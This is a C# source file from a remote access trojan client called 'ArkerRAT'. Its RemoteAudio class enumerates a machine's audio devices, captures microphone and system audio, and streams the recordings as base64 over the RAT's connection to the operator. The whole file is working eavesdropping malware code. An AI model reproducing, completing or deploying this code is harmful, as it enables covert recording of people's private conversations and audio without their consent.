using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using ArkerRATClient;
using NAudio.CoreAudioApi;
using NAudio.Wave;

namespace ARKERRATCLIENT2._0
{
    public static class RemoteAudio
    {
        private static MMDeviceEnumerator mMDeviceEnumerator = new MMDeviceEnumerator();
        private static MMDeviceCollection outputDeviceCollection = null;
        private static MMDeviceCollection inputDeviceCollection = null;

        public static void ApplySettings()
        {
            stopRemoteAudio=false;

            outputDeviceCollection = mMDeviceEnumerator.EnumerateAudioEndPoints(DataFlow.Render, DeviceState.All);
            inputDeviceCollection = mMDeviceEnumerator.EnumerateAudioEndPoints(DataFlow.Capture, DeviceState.All);

            waveInEventInput = null;
            loopbackCapture = null;
        }

        public static async void GetAndSendOutputDevices()
        {
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.Append("§RemoteAudioStart§§ODS§");

            foreach (var device in outputDeviceCollection)
            {
                stringBuilder.Append(device.ID + "|" + device.FriendlyName.ToString() +" Status:"+device.State.ToString()+ ",");
            }
            string data = stringBuilder.Remove(stringBuilder.Length-1,1).ToString() + "§RemoteAudioEnd§";
            await RATClientSession.SendData(data);
        }

        public static async void GetAndSendInputDevices()
        {
            StringBuilder stringBuilder= new StringBuilder();
            stringBuilder.Append("§RemoteAudioStart§§IDS§");
            foreach (var device in inputDeviceCollection)
            {
                stringBuilder.Append( device.ID+ "|" + device.FriendlyName.ToString() + " Status:" + device.State.ToString() + ",");
            }            
            string data = stringBuilder.Remove(stringBuilder.Length-1,1).ToString()+ "§RemoteAudioEnd§";
            await RATClientSession.SendData(data);
        }

        private static WasapiLoopbackCapture loopbackCapture =null;
        private static WaveInEvent waveInEventInput = null;

        public static void ChangeOutputDevice(string deviceID)
        {
            if (!string.IsNullOrEmpty(deviceID))
            {
                if (loopbackCapture != null)
                {
                    loopbackCapture.Dispose();
                }

                MMDevice outputDevice = mMDeviceEnumerator.GetDevice(deviceID);
                loopbackCapture = new WasapiLoopbackCapture(outputDevice);
                loopbackCapture.WaveFormat = new WaveFormat(41100, 1);
                loopbackCapture.DataAvailable += SendAudioOutputDataAsBase64;

                loopbackCapture.StopRecording();
                loopbackCapture.StartRecording();
            }
            else
            {
                try
                {
                    loopbackCapture.StopRecording();
                }catch(Exception ex) { }
                return;
            }
        }

        public static void ChangeInputDevice(string deviceID)
        {
            if(!string.IsNullOrEmpty(deviceID))
            {
                if(waveInEventInput!= null)
                {
                    waveInEventInput.Dispose();
                }

                waveInEventInput = new WaveInEvent();
                waveInEventInput.WaveFormat = new WaveFormat(41100, 1);
                waveInEventInput.DataAvailable += SendAudioInputDataAsBase64;
                waveInEventInput.StopRecording();

                //Since WaveIn only uses device number not device ID:s
                for (int i = 0; i < inputDeviceCollection.Count; i++)
                {
                    if (inputDeviceCollection[i].ID==deviceID)
                    {
                        waveInEventInput.DeviceNumber= i;
                        waveInEventInput.StartRecording();
                        return;
                    }
                }
                //__________________________
            }
            else
            {
                try
                {
                    waveInEventInput.StopRecording();
                }catch(Exception ex) { }
                return;
            }
        }

        private static async void SendAudioInputDataAsBase64(object sender, WaveInEventArgs e)
        {
            byte[] buffer = new byte[e.BytesRecorded];
            Buffer.BlockCopy(e.Buffer, 0, buffer, 0, e.BytesRecorded);

            if (RATClientSession.noConnection || stopRemoteAudio)
            {
                waveInEventInput.StopRecording();
                return;
            }

            string base64EncodedData = Convert.ToBase64String(buffer);
            await RATClientSession.SendData("§RemoteAudioStart§§IA§" + base64EncodedData + "§RemoteAudioEnd§");
        }

        private static async void SendAudioOutputDataAsBase64(object sender, WaveInEventArgs e)
        {
            byte[] buffer = new byte[e.BytesRecorded];
            Buffer.BlockCopy(e.Buffer, 0, buffer, 0, e.BytesRecorded);

            if (RATClientSession.noConnection || stopRemoteAudio)
            {
                waveInEventInput.StopRecording();
                return;
            }

            string base64EncodedData = Convert.ToBase64String(buffer);
            await RATClientSession.SendData("§RemoteAudioStart§§OA§" + base64EncodedData + "§RemoteAudioEnd§");
        }

        private static bool stopRemoteAudio = false;
        public static void StopRemoteAudio()
        {
            loopbackCapture.StopRecording();
            waveInEventInput.StopRecording();
            stopRemoteAudio = true;

            waveInEventInput = null;
            loopbackCapture = null;


            if (loopbackCapture != null)
            {
                loopbackCapture.Dispose();
            }

            if (waveInEventInput != null)
            {
                waveInEventInput.Dispose();
            }
        }
    }
}
